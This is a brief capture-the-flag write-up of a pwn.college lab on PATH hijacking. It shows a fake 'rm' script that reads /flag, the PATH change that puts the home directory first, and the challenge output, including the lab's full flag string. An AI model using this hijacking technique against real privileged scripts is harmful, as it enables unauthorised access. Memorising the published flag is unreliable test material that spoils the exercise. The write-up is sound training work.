In this challenge we have to get the flag by overwriting the rm command.
## My Solve

**Flag:**pwn.college{0dJnH5Oh-U0If849zZXvjxw0ZLO.QX3cjM1wCN4kjNzEzW}
In this challenge, I followed the instructions to get the flag.
```bash
hacker@path~hijacking-commands:~$ cat rm
#!/bin/bash
cat /flag
hacker@path~hijacking-commands:~$ which cat
/run/dojo/bin/cat
hacker@path~hijacking-commands:~$ PATH=""
hacker@path~hijacking-commands:~$ PATH=/home/hacker:/run/dojo/bin:$PATH
hacker@path~hijacking-commands:~$ echo $PATH
/home/hacker:/run/dojo/bin:
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{0dJnH5Oh-U0If849zZXvjxw0ZLO.QX3cjM1wCN4kjNzEzW}
```

## What I Learned
Through this challenge, I was able to learn how to get the flag by not letting it get removed by the rm command.

## Refernces
Did not use any references for this challenge.
